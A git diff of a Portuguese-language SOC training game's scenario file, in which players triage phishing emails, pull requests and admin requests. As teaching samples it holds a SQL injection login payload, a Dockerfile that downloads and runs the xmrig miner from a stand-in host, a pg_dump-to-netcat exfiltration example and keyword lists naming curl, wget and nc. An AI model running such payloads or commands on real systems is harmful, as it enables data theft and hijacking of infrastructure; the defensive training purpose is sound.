@@ -70,62 +70,41 @@ const CAMPAIGN_SHIFTS = [
     brandIcon: '📨',
     url: 'https://mail.techcore.com/mail/u/0/#inbox',
     wordContent: `
-      <h2>1. DOMÍNIOS ELETRÔNICOS CORPORATIVOS AUTORIZADOS</h2>
-      <p>O Departamento de TI estabelece os seguintes domínios oficiais para a organização TechCore Systems:</p>
+      <h2>1. DOMÍNIOS ELETRÔNICOS AUTORIZADOS</h2>
       <ul>
-        <li><code>@techcore.com</code>: Uso geral para colaboradores, analistas, desenvolvedores e diretoria.</li>
-        <li><code>@techcore-hr.com</code>: Uso exclusivo para comunicados e informativos do setor de Recursos Humanos.</li>
-        <li><strong>Atenção:</strong> Variações como <code>@tech-core.com</code> (com hífen), <code>@techcore-beneficios.com</code> ou extensões externas <strong>não pertencem à empresa</strong>.</li>
+        <li><code>@techcore.com</code>: Colaboradores e diretoria.</li>
+        <li><code>@techcore-hr.com</code>: Exclusivo para Recursos Humanos.</li>
+        <li><strong>Atenção:</strong> Variações como <code>@tech-core.com</code> (com hífen) ou <code>@techcore-beneficios.com</code> são <strong>FALSAS</strong>.</li>
       </ul>
 
-      <h2>2. REPOSITÓRIOS OFICIAIS NO GITHUB (@TechCore-Official)</h2>
-      <p>Qualquer Pull Request (PR) deve pertencer a um repositório oficial. São eles:</p>
+      <h2>2. REPOSITÓRIOS GITHUB (@TechCore-Official)</h2>
       <ul>
-        <li><code>core-api-v2</code> — API central de pagamentos e checkout PIX.</li>
-        <li><code>auth-service</code> — Autenticação e tokens de segurança.</li>
-        <li><code>deploy-pipeline</code> — Sistema de entrega automática de software (CI/CD).</li>
-      </ul>
-      <p><strong>⚠️ O que verificar em cada PR do GitHub:</strong></p>
-      <ul>
-        <li><strong>Repositório:</strong> O PR está em um dos 3 repositórios oficiais acima? Se não estiver → <strong>REJEITAR</strong>.</li>
-        <li><strong>Autor:</strong> O autor é um colaborador oficial <code>@techcore.com</code>? E-mails externos são suspeitos.</li>
-        <li><strong>No diff (código alterado), procure por:</strong>
+        <li>Repositórios oficiais: <code>core-api-v2</code>, <code>auth-service</code> e <code>deploy-pipeline</code>.</li>
+        <li><strong>⚠️ O que verificar nos PRs:</strong>
           <ul>
-            <li>Palavras como <code>curl</code>, <code>wget</code>, <code>nc</code> (netcat) enviando dados para fora.</li>
-            <li>URLs externas suspeitas (ex: <code>exfil-c2.net</code>, <code>mine-pool.org</code>) — são servidores de atacantes.</li>
-            <li>Referências a <code>xmrig</code> ou mineradores de criptomoeda.</li>
-            <li><code>$AWS_SECRET</code>, <code>$TOKEN</code> sendo enviados para fora da empresa.</li>
+            <li>O repositório é oficial? Se não for → <strong>REJEITAR</strong>.</li>
+            <li>Procure por <code>curl</code>, <code>wget</code>, mineradores (<code>xmrig</code>) ou envio de segredos para fora.</li>
           </ul>
         </li>
-        <li><strong>Se o diff parece limpo e o autor é oficial:</strong> É seguro aprovar.</li>
       </ul>
 
-      <h2>3. CONTROLE DE ACESSO E GESTÃO DE PRIVILÉGIOS (IAM)</h2>
-      <p>A concessão de privilégios segue o princípio de menor privilégio. Solicitações de Admin ou ClusterAdmin em Produção <strong>sem chamado aprovado por <code>beatriz.sec</code></strong> devem ser rejeitadas.</p>
+      <h2>3. CONTROLE DE ACESSO (IAM)</h2>
+      <ul>
+        <li>Solicitações de Admin em Produção sem chamado aprovado por <code>beatriz.sec</code> devem ser <strong>REJEITADAS</strong>.</li>
+      </ul>
     `,
     ceoDialogues: [
       {
         step: 1,
-        text: `
-          <p>Olá, Analista! Seja bem-vindo à linha de frente da <strong>TechCore</strong>.</p>
-          <p>Hoje iniciamos o <strong>Turno 1</strong> da nossa operação de segurança. Detectamos que criminosos estão tentando aplicar golpes de <strong>engenharia social</strong> e adulterar códigos da nossa organização.</p>
-        `
+        text: `<p>Bem-vindo à <strong>TechCore</strong>! No <strong>Turno 1</strong>, proteja a empresa contra golpes de phishing e adulteração de código.</p>`
       },
       {
         step: 2,
-        text: `
-          <p>Neste primeiro turno, sua estação monitora 3 canais essenciais:</p>
-          <p>• 📨 <strong>TechMail:</strong> Inspecione links suspeitos e remetentes falsificados.</p>
-          <p>• 🐙 <strong>GitHub:</strong> Audite diffs de Pull Requests em busca de código malicioso.</p>
-          <p>• 🔐 <strong>TechAccess (IAM):</strong> Bloqueie pedidos de admin sem chamado aprovado.</p>
-        `
+        text: `<p>Monitore 3 canais: 📨 <strong>TechMail</strong> (E-mails), 🐙 <strong>GitHub</strong> (PRs) e 🔐 <strong>TechAccess</strong> (IAM).</p>`
       },
       {
         step: 3,
-        text: `
-          <p>Consulte sempre a nossa guia do <strong>Word (Procedimentos_TI.doc)</strong> para verificar as regras corporativas.</p>
-          <p>Nossa política de qualidade permite <strong>no máximo 2 erros</strong> por turno para aprovação. Bom trabalho!</p>
-        `
+        text: `<p>Consulte as regras no <strong>Word</strong>. Margem permitida: <strong>no máximo 2 erros</strong>. Bom trabalho!</p>`
       }
     ],
     scenarios: [
@@ -138,15 +117,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=MarcosSilva(RH)',
         avatarChar: 'M',
         avatarColor: '#e91e63',
-        subject: '[URGENTE] Atualização Obrigatória de Cadastro de Benefícios',
-        snippet: 'Prezado colaborador, identificamos uma pendência no seu cadastro de benefícios corporativos...',
+        subject: '[URGENTE] Atualização de Cadastro de Benefícios',
+        snippet: 'Confirme seus dados no portal para manter o plano de saúde ativo.',
         attachmentFileName: 'solicitacao_cadastro_beneficios.pdf',
         meta: { 'De': 'Marcos Silva <marcos.rh@techcore-beneficios.com>', 'Para': 'voce@techcore.com', 'Data': '09:12', 'Segurança': 'SPF: NEUTRAL | DKIM: NONE' },
-        body: `<p>Prezado colaborador,</p><div class="email-quote-box"><p>Identificamos uma pendência no seu cadastro de benefícios corporativos. Para manter seu plano de saúde ativo, acesse o portal abaixo e confirme seus dados:<br><code>https://portal-colaborador.techcore-beneficios.com/login-sso</code></p></div>`,
+        body: `<p>Prezado colaborador,</p><div class="email-quote-box"><p>Identificamos uma pendência no seu cadastro. Confirme seus dados no link abaixo:<br><code>https://portal-colaborador.techcore-beneficios.com/login-sso</code></p></div>`,
         inspector: { type: 'url', label: 'Destino do Link', dest: 'https://portal-colaborador.techcore-beneficios.com/login-sso' },
         actions: [
-          { id: 'a1', label: '🌐 Acessar Link e Inserir Credenciais', correct: false, toastMsg: 'Credenciais inseridas.', logTitle: 'Vazamento em Phishing', consequence: 'Você enviou credenciais corporativas a servidores de golpistas.', explanation: 'O domínio @techcore-beneficios.com é falso. O RH oficial usa exclusivamente @techcore-hr.com.' },
-          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'E-mail reportado ao SOC.', logTitle: 'Phishing de RH Neutralizado', consequence: 'Domínio falso colocado na blacklist do firewall.', explanation: 'Excelente! Você checou o manual do Word e identificou o domínio ilegítimo.' }
+          { id: 'a1', label: '🌐 Acessar Link e Logar', correct: false, toastMsg: 'Credenciais inseridas.', logTitle: 'Vazamento em Phishing', consequence: 'Você enviou credenciais corporativas a golpistas.', explanation: '@techcore-beneficios.com é um domínio falso. O RH oficial usa apenas @techcore-hr.com.' },
+          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'E-mail reportado ao SOC.', logTitle: 'Phishing de RH Neutralizado', consequence: 'Domínio falso colocado na blacklist do firewall.', explanation: 'Excelente! O RH oficial usa apenas @techcore-hr.com.' }
         ]
       },
       {
@@ -158,15 +137,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=carlos.dev(TechHub)',
         avatarChar: 'C',
         avatarColor: '#2e7d32',
-        subject: 'PR #142: Melhoria de performance na consulta de pagamentos PIX',
-        snippet: 'Repositório: core-api-v2 | Autor: carlos.dev@techcore.com | Alterações no módulo de consulta',
+        subject: 'PR #142: Otimização de consulta PIX',
+        snippet: 'Repositório: core-api-v2 | Otimização na consulta de pedidos.',
         attachmentFileName: 'pix_optimization.diff',
         meta: { 'De': 'carlos.dev (Sênior)', 'Para': '@TechCore-Official / core-api-v2', 'Data': '10:55', 'Segurança': 'GPG Signature: VALID' },
-        body: `<p>PR #142 — Repositório: <code>core-api-v2</code></p><div class="email-quote-box"><p><strong>Autor:</strong> carlos.dev@techcore.com<br><strong>Repositório:</strong> core-api-v2<br><strong>Descrição:</strong> Otimização de consulta de banco de dados — alteração na query de pedidos para melhor performance.</p></div>`,
+        body: `<p>PR #142 — Repositório: <code>core-api-v2</code></p><div class="email-quote-box"><p><strong>Autor:</strong> carlos.dev@techcore.com<br><strong>Descrição:</strong> Otimização de query SQL para melhoria de performance.</p></div>`,
         inspector: { type: 'diff', label: 'Git Diff (core-api-v2/src/pix.ts)', diff: [{ type: 'info', text: '@@ -45,4 +45,4 @@ // Consulta de pedidos PIX' }, { type: 'removed', text: '- const q = db.query("SELECT * FROM orders");' }, { type: 'added', text: '+ const q = db.query("SELECT id, amount, status FROM orders USE INDEX (idx_date)");' }] },
         actions: [
-          { id: 'a1', label: '✅ Aprovar e Fazer Merge', correct: true, toastMsg: 'PR aprovado com sucesso.', logTitle: 'PR Legítimo Integrado', consequence: 'Deploy de pagamentos realizado com segurança.', explanation: 'Desenvolvedor oficial autorizado (carlos.dev@techcore.com) e repositório oficial core-api-v2. O diff não contém URLs externas, curl, wget ou envio de dados.' },
-          { id: 'a2', label: '❌ Rejeitar e Bloquear PR', correct: false, toastMsg: 'PR bloqueado.', logTitle: 'Falso Positivo em PR', consequence: 'Atraso indevido na entrega de features críticas.', explanation: 'carlos.dev é membro sênior oficial e o diff estava completamente limpo.' }
+          { id: 'a1', label: '✅ Aprovar e Fazer Merge', correct: true, toastMsg: 'PR aprovado com sucesso.', logTitle: 'PR Legítimo Integrado', consequence: 'Deploy de pagamentos realizado com segurança.', explanation: 'Desenvolvedor e repositório oficiais sem alterações suspeitas.' },
+          { id: 'a2', label: '❌ Rejeitar e Bloquear PR', correct: false, toastMsg: 'PR bloqueado.', logTitle: 'Falso Positivo em PR', consequence: 'Atraso indevido na entrega de otimização legítima.', explanation: 'carlos.dev é membro sênior oficial e o diff estava limpo.' }
         ]
       },
       {
@@ -178,14 +157,14 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=alex.intern(TechAccess)',
         avatarChar: 'A',
         avatarColor: '#f57c00',
-        subject: 'Solicitação de Privilégio: ClusterAdmin Kubernetes (Prod)',
-        snippet: 'Solicito permissão administrativa no cluster de produção para resolver um problema de deploy...',
+        subject: 'Solicitação de Acesso: ClusterAdmin Kubernetes (Prod)',
+        snippet: 'Solicito acesso admin no Kubernetes de Produção.',
         attachmentFileName: 'solicitacao_clusteradmin.iam',
         meta: { 'De': 'alex.intern (Estagiário)', 'Para': 'TechAccess Approver', 'Data': '13:28', 'Segurança': 'Chamado: Nenhum informado' },
-        body: `<p>Solicitação IAM:</p><div class="email-quote-box"><p>"Solicito acesso administrativo (ClusterAdmin) no Kubernetes de Produção para investigar e resolver um problema no deploy do meu projeto."</p></div>`,
+        body: `<p>Solicitação IAM:</p><div class="email-quote-box"><p>"Solicito acesso ClusterAdmin em Produção sem chamado informado."</p></div>`,
         inspector: { type: 'url', label: 'Matriz de Permissões IAM', dest: 'Solicitante: alex.intern -> Cargo: Estagiário -> Permissão: ClusterAdmin (PROD)' },
         actions: [
-          { id: 'a1', label: '🔓 Aprovar Permissão de Admin', correct: false, toastMsg: 'Admin concedido.', logTitle: 'Violação de Menor Privilégio', consequence: 'Acesso root liberado indevidamente em produção.', explanation: 'Nunca conceda privilégios de produção sem chamado de segurança aprovado por beatriz.sec.' },
+          { id: 'a1', label: '🔓 Aprovar Permissão de Admin', correct: false, toastMsg: 'Admin concedido.', logTitle: 'Violação de Menor Privilégio', consequence: 'Acesso root liberado indevidamente em produção.', explanation: 'Nunca conceda privilégios de produção sem chamado aprovado por beatriz.sec.' },
           { id: 'a2', label: '🚫 Rejeitar Solicitação', correct: true, toastMsg: 'Solicitação rejeitada.', logTitle: 'Acesso Indevido Barrado', consequence: 'Políticas de menor privilégio mantidas com sucesso.', explanation: 'Correto! Acessos administrativos em produção exigem aprovação formal.' }
         ]
       },
@@ -199,13 +178,13 @@ const CAMPAIGN_SHIFTS = [
         avatarChar: 'R',
         avatarColor: '#1976d2',
         subject: 'Informativo: Escala de Férias e Ponto Eletrônico',
-        snippet: 'Informamos que o espelho de ponto deste mês já está disponível para consulta...',
+        snippet: 'Espelho de ponto disponível para consulta na intranet.',
         attachmentFileName: 'escala_ponto_eletronico.pdf',
         meta: { 'De': 'RH TechCore <comunicados@techcore-hr.com>', 'Para': 'todos@techcore.com', 'Data': '15:08', 'Segurança': 'SPF: PASS | DKIM: PASS' },
-        body: `<p>Prezada equipe,</p><div class="email-quote-box"><p>O espelho de ponto do mês corrente está disponível para consulta na intranet corporativa. Acesse o portal interno para verificar suas horas e escala de férias.</p></div>`,
+        body: `<p>Prezada equipe,</p><div class="email-quote-box"><p>O espelho de ponto do mês corrente está disponível para consulta na intranet corporativa.</p></div>`,
         inspector: { type: 'url', label: 'Cabeçalho do Remetente', dest: 'Remetente: comunicados@techcore-hr.com (SPF: PASS | DKIM: PASS)' },
         actions: [
-          { id: 'a1', label: '📨 Manter / Arquivar Comunicado', correct: true, toastMsg: 'Comunicado arquivado.', logTitle: 'Informativo de RH Processado', consequence: 'Comunicação interna mantida sem incidentes.', explanation: 'O domínio @techcore-hr.com é o canal oficial de RH registrado no manual.' },
+          { id: 'a1', label: '📨 Manter / Arquivar Comunicado', correct: true, toastMsg: 'Comunicado arquivado.', logTitle: 'Informativo de RH Processado', consequence: 'Comunicação interna mantida sem incidentes.', explanation: 'O domínio @techcore-hr.com é o canal oficial de RH.' },
           { id: 'a2', label: '🚨 Bloquear Domínio do RH', correct: false, toastMsg: 'Canal bloqueado.', logTitle: 'Falso Positivo em Canal de RH', consequence: 'Você bloqueou o canal legítimo de avisos da empresa.', explanation: '@techcore-hr.com está expressamente autorizado no Word.' }
         ]
       },
@@ -218,22 +197,22 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=ksbackend2024',
         avatarChar: 'K',
         avatarColor: '#616161',
-        subject: 'PR #1: Adicionar container de processamento noturno',
-        snippet: 'Repositório: crypto-worker-node | Autor: ks.backend@devcontrib.io | Atualização em Dockerfile',
+        subject: 'PR #1: Container de processamento noturno',
+        snippet: 'Repositório: crypto-worker-node | Atualização em Dockerfile',
         attachmentFileName: 'dockerfile_patch.diff',
         meta: { 'De': 'ks.backend (Conta Externa)', 'Para': 'crypto-worker-node', 'Data': '17:15', 'Segurança': 'Repositório Não Cadastrado' },
-        body: `<p>PR #1 — Repositório: <code>crypto-worker-node</code></p><div class="email-quote-box"><p><strong>Autor:</strong> shadow.dev@external.net<br><strong>Repositório:</strong> crypto-worker-node<br><strong>Descrição:</strong> Adição de rotina de segundo plano para otimização de jobs de lote.</p></div>`,
+        body: `<p>PR #1 — Repositório: <code>crypto-worker-node</code> (não cadastrado)</p>`,
         inspector: { type: 'diff', label: 'Git Diff (crypto-worker-node/Dockerfile)', diff: [{ type: 'info', text: '@@ -1,2 +1,4 @@' }, { type: 'added', text: '+ RUN wget https://mine-pool.org/xmrig.tar.gz' }, { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://mine-pool.org:3333"]' }] },
         actions: [
-          { id: 'a1', label: '✅ Aprovar PR e Deploy', correct: false, toastMsg: 'Deploy realizado.', logTitle: 'Injeção de Cryptominer', consequence: 'Minerador de Monero implantado nos servidores da nuvem, consumindo recursos e gerando prejuízo.', explanation: 'O repositório crypto-worker-node não é oficial. O diff usa wget para baixar xmrig (minerador de criptomoeda) de um site externo.' },
-          { id: 'a2', label: '🚫 Fechar PR e Banir Usuário', correct: true, toastMsg: 'Cryptominer Bloqueado', consequence: 'Uso indevido de recursos da infraestrutura prevenido.', explanation: 'Perfeito! Você identificou: repositório não oficial + autor externo + wget de site suspeito + minerador xmrig.' }
+          { id: 'a1', label: '✅ Aprovar PR e Deploy', correct: false, toastMsg: 'Deploy realizado.', logTitle: 'Injeção de Cryptominer', consequence: 'Minerador de Monero implantado nos servidores da nuvem.', explanation: 'Repositório não oficial e download do minerador xmrig.' },
+          { id: 'a2', label: '🚫 Fechar PR e Banir Usuário', correct: true, toastMsg: 'Cryptominer Bloqueado', consequence: 'Uso indevido de recursos da infraestrutura prevenido.', explanation: 'Excelente! Repositório não oficial e script malicioso identificados.' }
         ]
       }
     ]
   },
 
   // ----------------------------------------------------
-  // TURNO 2: Auditoria de Banco de Dados + E-mails & PRs (FILA MISTA)
+  // TURNO 2: Auditoria de Banco de Dados + E-mails & PRs
   // ----------------------------------------------------
   {
     shiftNumber: 2,
@@ -242,36 +221,19 @@ const CAMPAIGN_SHIFTS = [
     brandIcon: '🗄️',
     url: 'https://db-monitor.techcore.internal/audit/#sql-logs',
     wordContent: `
-      <h2>1. DIRETRIZES DE BANCO DE DADOS (TECHDB / POSTGRESQL)</h2>
-      <p>O acesso e operações no Banco de Dados Central de Produção (PostgreSQL) seguem regras rígidas:</p>
+      <h2>1. DIRETRIZES DE BANCO DE DADOS (TECHDB)</h2>
       <ul>
-        <li><code>dba_ops_techcore</code>: Usuário exclusivo da equipe de DBA para manutenções programadas (VACUUM, REINDEX, ANALYZE).</li>
-        <li><code>svc_payment_api</code>: Usuário de serviço da API de pagamentos — apenas SELECT e INSERT em tabelas de transações PIX autorizadas.</li>
-        <li><code>reporting_reader</code>: Usuário somente-leitura do sistema de relatórios gerenciais — apenas SELECT em views de BI.</li>
-        <li><strong>Proibições Estritas:</strong> Comandos com <code>UNION SELECT</code> em campos de formulário, criação de roles com atributo <code>SUPERUSER</code>, comandos <code>pg_dump</code> direcionados para IPs externos e DROP TABLE sem ticket aprovado.</li>
+        <li><code>dba_ops_techcore</code>: Manutenção programada (REINDEX, ANALYZE).</li>
+        <li><code>svc_payment_api</code>: Serviço de pagamentos PIX (SELECT/INSERT).</li>
+        <li><code>reporting_reader</code>: Leitura de relatórios BI (SELECT).</li>
+        <li><strong>Proibido:</strong> Comandos <code>UNION SELECT</code> em logins, <code>SUPERUSER</code>, <code>DROP TABLE</code> sem ticket ou envio de dump para IP externo.</li>
       </ul>
 
-      <h2>2. COLABORADORES AUTORIZADOS PARA OPERAÇÕES CRÍTICAS DE DB</h2>
+      <h2>2. COLABORADORES AUTORIZADOS</h2>
       <ul>
-        <li><code>fernanda.dba@techcore.com</code>: DBA Sênior — responsável por janelas de manutenção autorizadas.</li>
-        <li><code>rodrigo.infra@techcore.com</code>: DevOps — autorizado apenas para operações de REINDEX e ANALYZE via pipeline.</li>
-        <li><strong>Atenção:</strong> Qualquer solicitação de operação crítica por e-mail proveniente de domínio diferente de <code>@techcore.com</code> deve ser negada imediatamente.</li>
+        <li><code>fernanda.dba@techcore.com</code>: DBA Sênior (exclusivo <code>@techcore.com</code>).</li>
+        <li><code>rodrigo.infra@techcore.com</code>: DevOps para ANALYZE e REINDEX via pipeline.</li>
       </ul>
-
-      <h2>4. O QUE SÃO "CONSULTAS SQL"? (GUIA RÁPIDO PARA ANALISTAS)</h2>
-      <p><strong>SQL</strong> é a linguagem usada para conversar com o banco de dados. Pense como um "pedido de informação". Exemplos do que cada comando faz:</p>
-      <ul>
-        <li><code>SELECT</code> — Lê dados. Ex: "Me mostre todos os pedidos PIX de hoje." ✅ Normal.</li>
-        <li><code>INSERT</code> — Adiciona dados. Ex: "Registre esse novo pagamento." ✅ Normal se vem do usuário certo.</li>
-        <li><code>CREATE ROLE ... SUPERUSER</code> — Cria um usuário com poderes absolutos no banco. 🚨 <strong>Proibido sem autorização.</strong></li>
-        <li><code>DROP TABLE</code> — <strong>Apaga uma tabela inteira</strong> permanentemente. 🚨 <strong>Proibido sem ticket aprovado.</strong></li>
-        <li><code>pg_dump | nc IP_EXTERNO</code> — Exporta o banco inteiro e envia para um IP de fora. 🚨 <strong>Ataque de exfiltração.</strong></li>
-        <li><code>UNION SELECT ... FROM admin_users</code> — Truque hacker para roubar dados de tabelas secretas junto com uma consulta normal. 🚨 <strong>Ataque de SQL Injection.</strong></li>
-      </ul>
-      <p><strong>Resumo prático:</strong> Quando vir uma "consulta SQL" no TechDB, pergunte: <em>Quem está executando? O usuário está autorizado? O comando faz algo destrutivo ou envia dados para fora?</em></p>
-
-      <h2>5. MONITORAMENTO CONTÍNUO DE E-MAILS E CI/CD</h2>
-      <p>Mesmo durante a auditoria de banco de dados, e-mails de phishing (ex: <code>@tech-core.com</code> com hífen ou <code>@techcore-beneficios.com</code>) e alterações maliciosas em workflows de CI/CD continuam ativos.</p>
     `,
     ceoDialogues: [
       {
@@ -279,48 +241,28 @@ const CAMPAIGN_SHIFTS = [
         speaker: 'Rogério Silva',
         role: 'CEO TechCore',
         avatar: 'ceo_rogerio.jpg',
-        text: `
-          <p><strong>Rogério Silva (CEO):</strong> "Rodrigo, a situação esquentou! O Analista conteve a primeira onda no Turno 1, mas relatórios mostram que os criminosos agora estão tentando invadir diretamente o nosso <strong>Banco de Dados de Produção (TechDB)</strong>!"</p>
-          <p><strong>Rogério Silva (CEO):</strong> "Preciso que você me explique e oriente o Analista sobre a anatomia desses ataques e <strong>como evitar erros</strong> na análise da fila mista."</p>
-        `
+        text: `<p><strong>Rogério Silva (CEO):</strong> "Atenção! No <strong>Turno 2</strong>, os invasores estão atacando nosso <strong>Banco de Dados (TechDB)</strong>!"</p>`
       },
       {
         step: 2,
         speaker: 'Rodrigo Rosa',
         role: 'CISO TechCore',
         avatar: 'rodrigo_rosa.jpg',
-        text: `
-          <p><strong>Rodrigo Rosa (CISO):</strong> "Com certeza, Rogério! Para defender a infraestrutura e evitar falhas neste <strong>Turno 2</strong>, o Analista precisa ficar atento às 3 ameaças principais:"</p>
-          <ul style="margin-top:6px; margin-left: 16px; line-height: 1.45;">
-            <li><strong>1. Injeções de Banco (TechDB):</strong> O ataque clássico é <code>SQL Injection</code> (ex: <code>UNION SELECT</code> no login). Usuários autorizados são apenas <code>dba_ops_techcore</code>, <code>svc_payment_api</code> e <code>reporting_reader</code>. Se vir <code>DROP TABLE</code> sem ticket aprovado, BLOQUEIE!</li>
-            <li><strong>2. Phishing de E-mail com Hífen:</strong> Atacantes usam domínios falsos sutis (ex: <code>@tech-core.com</code> com hífen ou <code>@techcore-beneficios.com</code>). O canal oficial de RH é estritamente <code>@techcore-hr.com</code>.</li>
-            <li><strong>3. Injeção de Scripts no CI/CD:</strong> No GitHub, analise PRs de forks externos que tentam rodar <code>curl</code> ou <code>wget</code> para exfiltrar a chave <code>AWS_SECRET_ACCESS_KEY</code>.</li>
-          </ul>
-        `
+        text: `<p><strong>Rodrigo Rosa (CISO):</strong> "Fique atento a: <strong>1.</strong> SQL Injection (<code>UNION SELECT</code>, <code>DROP TABLE</code>); <strong>2.</strong> Phishing com hífen (<code>@tech-core.com</code>); <strong>3.</strong> Injeção no CI/CD."</p>`
       },
       {
         step: 3,
         speaker: 'Rodrigo Rosa',
         role: 'CISO TechCore',
         avatar: 'rodrigo_rosa.jpg',
-        text: `
-          <p><strong>Rodrigo Rosa (CISO):</strong> "Como evitar erros de análise na prática:"</p>
-          <ol style="margin-top:6px; margin-left: 16px; line-height: 1.45;">
-            <li><strong>Abra a guia do Word (Procedimentos_TI.doc):</strong> Ela contém a lista completa de usuários autorizados e domínios legítimos.</li>
-            <li><strong>Clique no Card de Anexo:</strong> Sempre abra o código do anexo para inspecionar os comandos SQL reais antes de decidir.</li>
-            <li><strong>Valide o remetente original:</strong> DBA enviando e-mail de <code>@techcore-ops.net</code> ou <code>@gmail.com</code> é golpe. Solicitações de DBA só valem se vierem de <code>@techcore.com</code>.</li>
-          </ol>
-        `
+        text: `<p><strong>Rodrigo Rosa (CISO):</strong> "Consulte os usuários autorizados no <strong>Word</strong> e valide o remetente oficial."</p>`
       },
       {
         step: 4,
         speaker: 'Rogério Silva',
         role: 'CEO TechCore',
         avatar: 'ceo_rogerio.jpg',
-        text: `
-          <p><strong>Rogério Silva (CEO):</strong> "Excelente aula de segurança, Rodrigo! As instruções ficaram cristalinas."</p>
-          <p><strong>Rogério Silva (CEO):</strong> "Analista SOC, você ouviu o CISO Rodrigo Rosa! A sua meta no Turno 2 é auditar toda a fila com atenção máxima. A margem de tolerância é de <strong>no máximo 2 erros</strong>. Boa operação!"</p>
-        `
+        text: `<p><strong>Rogério Silva (CEO):</strong> "Sua meta é auditar toda a fila mista. Margem permitida: <strong>no máximo 2 erros</strong>. Boa sorte!"</p>`
       }
     ],
     scenarios: [
@@ -333,15 +275,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=WAF/TechDBMonitor',
         avatarChar: 'W',
         avatarColor: '#d93025',
-        subject: 'Alerta WAF: Bloqueio Preventivo no Endpoint de Login',
-        snippet: 'Payload detectado no campo de login de parceiros...',
+        subject: 'Alerta WAF: Injeção SQL no Login',
+        snippet: 'Payload malicioso detectado no campo de login de parceiros.',
         attachmentFileName: 'auth_sqli_payload.sql',
         meta: { 'Origem': 'IP 185.220.101.44 (Tor Exit Node)', 'Endpoint': '/api/v1/auth/partner-login', 'Data': '09:28', 'Status': 'Interceptado no WAF' },
-        body: `<p>Registro do Firewall de Aplicação Web:</p><div class="email-quote-box"><p>Payload recebido no campo de login:<br><code>' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --</code></p></div>`,
+        body: `<p>Payload recebido no campo de login:<br><code>' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --</code></p>`,
         inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT * FROM partners WHERE email = \'\' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --' },
         actions: [
-          { id: 'a1', label: '🛡️ Bloquear IP Permanentemente & Sanitizar Query', correct: true, toastMsg: 'Ataque de SQLi bloqueado.', logTitle: 'SQL Injection Neutralizada', consequence: 'IP malicioso banido no Cloudflare e vulnerabilidade de SQLi mitigada.', explanation: 'Identificação correta da tentativa de extração de senhas via UNION SELECT.' },
-          { id: 'a2', label: '⚪ Ignorar Alerta e Liberar Conexão', correct: false, toastMsg: 'Log ignorado.', logTitle: 'Vazamento de Hashes de Senhas', consequence: 'O invasor completou a injeção e extraiu todos os hashes de senha do banco.', explanation: 'UNION SELECT em formulário de autenticação é um ataque claro de SQLi.' }
+          { id: 'a1', label: '🛡️ Bloquear IP e Sanitizar Query', correct: true, toastMsg: 'Ataque de SQLi bloqueado.', logTitle: 'SQL Injection Neutralizada', consequence: 'IP malicioso banido e vulnerabilidade corrigida.', explanation: 'Tentativa de extração de senhas via UNION SELECT neutralizada.' },
+          { id: 'a2', label: '⚪ Ignorar Alerta e Liberar', correct: false, toastMsg: 'Log ignorado.', logTitle: 'Vazamento de Hashes de Senhas', consequence: 'Hashes de senha do banco foram vazados.', explanation: 'UNION SELECT em login é um ataque claro de SQL Injection.' }
         ]
       },
       {
@@ -353,15 +295,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuportedeTICentral',
         avatarChar: 'K',
         avatarColor: '#c2185b',
-        subject: '[ALERTA DE SEGURANÇA] Falha no Token 2FA - Redefinição Obrigatória',
-        snippet: 'Detectamos tentativas não autorizadas. Sincronize seu novo token 2FA no link...',
+        subject: '[ALERTA] Redefinição de Token 2FA',
+        snippet: 'Sincronize seu novo token 2FA no link.',
         attachmentFileName: 'redefinicao_token_2fa.html',
         meta: { 'De': 'admin@tech-core.com', 'Para': 'voce@techcore.com', 'Data': '10:43', 'Segurança': 'SPF: FAIL' },
-        body: `<p>Atenção Colaborador,</p><div class="email-quote-box"><p>Detectamos tentativas de login suspeitas na sua conta corporativa. Clique no link para revalidar seu token de dois fatores:<br><code>https://sso-auth.tech-core.com/sync-mfa</code></p></div>`,
+        body: `<p>Redefina seu token de dois fatores no link:<br><code>https://sso-auth.tech-core.com/sync-mfa</code></p>`,
         inspector: { type: 'url', label: 'Inspeção Técnica de Domínio', dest: 'https://sso-auth.tech-core.com/sync-mfa' },
         actions: [
-          { id: 'a1', label: '🔑 Clicar no Link e Reconfigurar 2FA', correct: false, toastMsg: 'Sessão enviada para servidor externo.', logTitle: 'Invasão via Typosquatting', consequence: 'Os atacantes capturaram o seu token 2FA através do domínio falso com hífen.', explanation: 'O domínio do remetente era @tech-core.com (com hífen), uma fraude explícita.' },
-          { id: 'a2', label: '🛡️ Reportar Phishing / Typosquatting ao SOC', correct: true, toastMsg: 'Domínio com hífen bloqueado.', logTitle: 'Typosquatting Bloqueado com Sucesso', consequence: 'Domínio malicioso com hífen colocado na blacklist do firewall.', explanation: 'Muito bem! Você notou o hífen no domínio falso @tech-core.com.' }
+          { id: 'a1', label: '🔑 Clicar no Link e Reconfigurar', correct: false, toastMsg: 'Sessão enviada.', logTitle: 'Invasão via Typosquatting', consequence: 'Token 2FA capturado por golpistas.', explanation: 'Remetente @tech-core.com possui hífen e é falso.' },
+          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'Domínio com hífen bloqueado.', logTitle: 'Typosquatting Bloqueado', consequence: 'Domínio malicioso com hífen colocado na blacklist.', explanation: 'Excelente! Você identificou o hífen no domínio falso @tech-core.com.' }
         ]
       },
       {
@@ -373,15 +315,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=svc_payment_api(TechDB)',
         avatarChar: 'P',
         avatarColor: '#10b981',
